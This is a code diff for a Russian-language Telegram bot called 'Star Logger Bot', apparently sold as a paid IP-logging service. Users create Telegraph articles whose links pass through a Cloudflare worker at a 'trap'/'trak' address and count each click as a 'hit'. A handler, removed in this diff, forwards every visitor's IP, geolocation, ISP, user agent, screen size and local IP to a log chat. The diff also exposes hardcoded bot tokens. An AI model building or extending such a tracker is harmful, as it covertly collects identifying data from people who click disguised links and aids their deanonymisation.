@@ -1,7 +1,13 @@
 # language: Python, file: main.py, runtime: Python 3.13+, target: Telegram Bot on fadehost
-import os, time, string, secrets, sqlite3, urllib.parse, json
+import os
+import time
+import string
+import secrets
+import sqlite3
+import urllib.parse
 from datetime import datetime
 from dotenv import load_dotenv
+
 import telebot
 from telebot import types
 from telegraph import Telegraph
@@ -9,10 +15,11 @@ from telegraph import Telegraph
 # ---------- CONFIG ----------
 load_dotenv()
 
-BOT_TOKEN   = os.environ.get("BOT_TOKEN") or os.environ.get("TELEGRAM_BOT_TOKEN") or "9043148910:AAF_ewMZkG7fuIGF-xWfXdIVHeuQ0V-duM0"
+BOT_TOKEN   = os.environ.get("BOT_TOKEN") or os.environ.get("TELEGRAM_BOT_TOKEN") or "9010108280:AAH18qw9pxpEm_FiDTQtOp4KMOWpLJ9DqOE"
 ADMIN_IDS   = [int(x) for x in (os.environ.get("ADMIN_IDS") or "8297446667").split(",") if x.strip().lstrip("-").isdigit()]
 LOG_CHAT_ID = int(os.environ.get("LOG_CHAT_ID") or "-1004382024668")
-WORKER_URL  = os.environ.get("WORKER_URL") or "https://trap.geminialex12.workers.dev"
+# НОВЫЙ ДОМЕН
+WORKER_URL  = os.environ.get("WORKER_URL") or "https://trak.geminialex12.workers.dev"
 DB_PATH     = os.environ.get("DB_PATH") or "/tmp/database2.db"
 
 CHANNEL_ID    = -1004336153105
@@ -180,7 +187,7 @@ def make_article(title, text, img_url, template_name, author_id, author_username
     msg = f"<b>⭐️Star Logger Bot⭐️</b>\n<b>⭐️Статья создана</b>\n=============================\n⭐️Тема: {title}\n⭐️Ссылка: {url}"
     return msg, url, slug
 
-# ---------- МЕНЮ ----------
+# ---------- MENUS ----------
 def show_main_menu(uid):
     kb = types.InlineKeyboardMarkup(row_width=2)
     kb.add(types.InlineKeyboardButton("⭐️Наш канал", url=CHANNEL_LINK))
@@ -200,55 +207,20 @@ def admin_menu(chat_id):
     kb.add(types.InlineKeyboardButton("💰 Выдать баланс", callback_data='admin_give_bal'))
     kb.add(types.InlineKeyboardButton("👥 Все юзеры", callback_data='admin_users'))
     kb.add(types.InlineKeyboardButton("🔗 Все ссылки", callback_data='admin_links'))
-    kb.add(types.InlineKeyboardButton("⚙️ Тема для логов", callback_data='admin_set_thread'))
     kb.add(types.InlineKeyboardButton("📢 Рассылка", callback_data='admin_broadcast'))
     kb.add(types.InlineKeyboardButton("📊 Статистика", callback_data='admin_stats'))
     kb.add(types.InlineKeyboardButton("📦 База данных", callback_data='admin_dump'))
     with open('had2.jpg', 'rb') as had:
         bot.send_photo(chat_id, had, caption='<b>⭐️Админ-меню</b>', reply_markup=kb)
 
-# ---------- ПЕРЕХВАТ ЛОГОВ ИЗ CLOUDFLARE ----------
-@bot.message_handler(func=lambda m: m.text and m.text.startswith("LOG:"))
-def handle_cloudflare_log(message):
-    try:
-        data = json.loads(message.text[4:]) # убираем LOG:
-        thread_id = get_setting("thread_id", "4472")
-        
-        text = (
-            f"<b>🎯 Переход</b>\n"
-            f"<b>Цель:</b> {data['page_title']}\n"
-            f"<b>Создал:</b> {data['page_user']}\n"
-            f"──────────────────\n"
-            f"<b>IP:</b> <code>{data['ip']}</code>\n"
-            f"<b>Гео:</b> {data['geo']}\n"
-            f"<b>ISP:</b> {data['isp']}\n"
-            f"──────────────────\n"
-            f"<b>UA:</b> <code>{data['ua'][:80]}</code>\n"
-            f"<b>Экран:</b> {data['screen']} | <b>Ядра:</b> {data['cores']}\n"
-            f"<b>Local IP:</b> <code>{data['local_ip']}</code>"
-        )
-        
-        # Отправляем в тему
-        payload = {
-            "chat_id": LOG_CHAT_ID,
-            "text": text,
-            "parse_mode": "HTML",
-            "disable_web_page_preview": True
-        }
-        if thread_id and thread_id != "0":
-            payload["message_thread_id"] = int(thread_id)
-            
-        bot.send_message(**payload)
-    except Exception as e:
-        print(f"Ошибка лога: {e}")
-
-# ---------- СТАРТ ----------
+# ---------- START ----------
 @bot.message_handler(commands=['start'])
 def cmd_start(message):
     uid = message.from_user.id
     username = message.from_user.username or ""
     if not is_registered(uid):
         register(uid, username)
+        send_log(f"⭐️ Новый: <code>{uid}</code> @{username or '-'}")
         
     if not check_sub(uid) and uid not in ADMIN_IDS:
         kb = types.InlineKeyboardMarkup()
@@ -257,6 +229,7 @@ def cmd_start(message):
         kb.add(types.InlineKeyboardButton("✅ Проверить", callback_data='check_sub'))
         bot.send_message(uid, "<b>⚠️ Для использования бота подпишись на канал и вступи в группу!</b>", reply_markup=kb)
         return
+
     show_main_menu(uid)
 
 @bot.callback_query_handler(func=lambda c: c.data == 'check_sub')
@@ -267,24 +240,77 @@ def cb_check_sub(call):
     else:
         bot.answer_callback_query(call.id, "❌ Ты подписался не на всё! Проверь канал и группу.", show_alert=True)
 
-# ---------- АДМИНКА ----------
-@bot.message_handler(commands=['admin'])
-def cmd_admin(m): admin_menu(m.chat.id)
-
-@bot.callback_query_handler(func=lambda c: c.data == 'admin_set_thread' and c.from_user.id in ADMIN_IDS)
-def cb_admin_set_thread(call):
-    current = get_setting("thread_id", "4472")
-    bot.send_message(call.message.chat.id, f"<b>Текущий ID темы:</b> <code>{current}</code>\n\nВведи новый ID темы (или 0 для General):")
-    bot.register_next_step_handler(call.message, _admin_save_thread)
+# ---------- CALLBACKS ----------
+@bot.callback_query_handler(func=lambda c: c.data == 'home')
+def cb_home(call):
+    try: bot.delete_message(call.message.chat.id, call.message.message_id)
+    except Exception: pass
+    show_main_menu(call.message.chat.id)
     bot.answer_callback_query(call.id)
 
-def _admin_save_thread(message):
-    val = message.text.strip()
-    if not val.isdigit():
-        bot.reply_to(message, "❌ ID должен быть числом.")
+@bot.callback_query_handler(func=lambda c: c.data == 'cabinet')
+def cb_cabinet(call):
+    uid = call.message.chat.id
+    links = get_user_links(uid)
+    total_hits = sum(l["hits"] for l in links)
+    prem = "💎 Premium" if is_premium(uid) else "Обычный"
+    lines = [
+        f"<b>⭐️Профиль</b>",
+        "=============================",
+        f"🆔 ID: <code>{uid}</code>",
+        f"📊 Статус: {prem}",
+        f"💰 Баланс: <b>{get_balance(uid):.2f}$</b>",
+        f"🔗 Линков: {len(links)}",
+        f"🎯 Хитов: {total_hits}",
+        "=============================",
+    ]
+    if is_premium(uid):
+        anon = "Вкл" if get_setting(f"anon_{uid}", "0") == "1" else "Выкл"
+        lines.append(f"💎 Анонимные ссылки: {anon}")
+    else:
+        lines.append(f"💎 Купить Premium за {PREMIUM_PRICE}$")
+
+    kb = types.InlineKeyboardMarkup()
+    if not is_premium(uid):
+        kb.add(types.InlineKeyboardButton(f"💎 Купить Premium ({PREMIUM_PRICE}$)", callback_data="buy_premium"))
+    else:
+        kb.add(types.InlineKeyboardButton("🕵️ Анонимность (вкл/выкл)", callback_data="toggle_anon"))
+        
+    kb.add(types.InlineKeyboardButton("📞 Поддержка", url=f"https://t.me/{SUPPORT[1:]}"))
+    kb.add(types.InlineKeyboardButton("❌Назад", callback_data="home"))
+    try:
+        bot.edit_message_caption(chat_id=uid, message_id=call.message.message_id, caption="\n".join(lines), reply_markup=kb)
+    except Exception:
+        bot.send_message(uid, "\n".join(lines), reply_markup=kb)
+    bot.answer_callback_query(call.id)
+
+@bot.callback_query_handler(func=lambda c: c.data == 'toggle_anon')
+def cb_toggle_anon(call):
+    uid = call.from_user.id
+    current = get_setting(f"anon_{uid}", "0")
+    new_val = "0" if current == "1" else "1"
+    set_setting(f"anon_{uid}", new_val)
+    bot.answer_callback_query(call.id, "✅ Настройки анонимности обновлены!")
+    cb_cabinet(call)
+
+@bot.callback_query_handler(func=lambda c: c.data == 'buy_premium')
+def cb_buy_premium(call):
+    uid = call.from_user.id
+    if is_premium(uid):
+        bot.answer_callback_query(call.id, "✅ У тебя уже есть Premium!", show_alert=True)
         return
-    set_setting("thread_id", val)
-    bot.reply_to(message, f"✅ ID темы изменен на <code>{val}</code>.\nТеперь логи будут идти туда.")
+    bal = get_balance(uid)
+    if bal < PREMIUM_PRICE:
+        bot.answer_callback_query(call.id, f"❌ Недостаточно средств!\nНужно: {PREMIUM_PRICE}$\nУ тебя: {bal:.2f}$", show_alert=True)
+        return
+    add_balance(uid, -PREMIUM_PRICE)
+    set_premium(uid)
+    bot.answer_callback_query(call.id, "💎 Premium успешно активирован!", show_alert=True)
+    cb_cabinet(call)
+
+# ---------- ADMIN ----------
+@bot.message_handler(commands=['admin'])
+def cmd_admin(m): admin_menu(m.chat.id)
 
 @bot.callback_query_handler(func=lambda c: c.data == 'admin_give_bal' and c.from_user.id in ADMIN_IDS)
 def cb_admin_give(call):
@@ -358,68 +384,7 @@ def cb_admin_dump(call):
     except Exception as e: bot.send_message(call.message.chat.id, f"❌ {e}")
     bot.answer_callback_query(call.id)
 
-# ---------- ПРОФИЛЬ / ПРЕМИУМ ----------
-@bot.callback_query_handler(func=lambda c: c.data == 'cabinet')
-def cb_cabinet(call):
-    uid = call.message.chat.id
-    links = get_user_links(uid)
-    total_hits = sum(l["hits"] for l in links)
-    prem = "💎 Premium" if is_premium(uid) else "Обычный"
-    lines = [
-        f"<b>⭐️Профиль</b>",
-        "=============================",
-        f"🆔 ID: <code>{uid}</code>",
-        f"📊 Статус: {prem}",
-        f"💰 Баланс: <b>{get_balance(uid):.2f}$</b>",
-        f"🔗 Линков: {len(links)}",
-        f"🎯 Хитов: {total_hits}",
-        "=============================",
-    ]
-    if is_premium(uid):
-        anon = "Вкл" if get_setting(f"anon_{uid}", "0") == "1" else "Выкл"
-        lines.append(f"💎 Анонимные ссылки: {anon}")
-    else:
-        lines.append(f"💎 Купить Premium за {PREMIUM_PRICE}$")
-
-    kb = types.InlineKeyboardMarkup()
-    if not is_premium(uid):
-        kb.add(types.InlineKeyboardButton(f"💎 Купить Premium ({PREMIUM_PRICE}$)", callback_data="buy_premium"))
-    else:
-        kb.add(types.InlineKeyboardButton("🕵️ Анонимность (вкл/выкл)", callback_data="toggle_anon"))
-        
-    kb.add(types.InlineKeyboardButton("📞 Поддержка", url=f"https://t.me/{SUPPORT[1:]}"))
-    kb.add(types.InlineKeyboardButton("❌Назад", callback_data="home"))
-    try:
-        bot.edit_message_caption(chat_id=uid, message_id=call.message.message_id, caption="\n".join(lines), reply_markup=kb)
-    except Exception:
-        bot.send_message(uid, "\n".join(lines), reply_markup=kb)
-    bot.answer_callback_query(call.id)
-
-@bot.callback_query_handler(func=lambda c: c.data == 'toggle_anon')
-def cb_toggle_anon(call):
-    uid = call.from_user.id
-    current = get_setting(f"anon_{uid}", "0")
-    new_val = "0" if current == "1" else "1"
-    set_setting(f"anon_{uid}", new_val)
-    bot.answer_callback_query(call.id, "✅ Настройки анонимности обновлены!")
-    cb_cabinet(call)
-
-@bot.callback_query_handler(func=lambda c: c.data == 'buy_premium')
-def cb_buy_premium(call):
-    uid = call.from_user.id
-    if is_premium(uid):
-        bot.answer_callback_query(call.id, "✅ У тебя уже есть Premium!", show_alert=True)
-        return
-    bal = get_balance(uid)
-    if bal < PREMIUM_PRICE:
-        bot.answer_callback_query(call.id, f"❌ Недостаточно средств!\nНужно: {PREMIUM_PRICE}$\nУ тебя: {bal:.2f}$", show_alert=True)
-        return
-    add_balance(uid, -PREMIUM_PRICE)
-    set_premium(uid)
-    bot.answer_callback_query(call.id, "💎 Premium успешно активирован!", show_alert=True)
-    cb_cabinet(call)
-
-# ---------- ЛОГГЕР ----------
+# ---------- LOGGER ----------
 @bot.callback_query_handler(func=lambda c: c.data == 'logger')
 def cb_logger(call):
     if not check_sub(call.from_user.id) and call.from_user.id not in ADMIN_IDS:
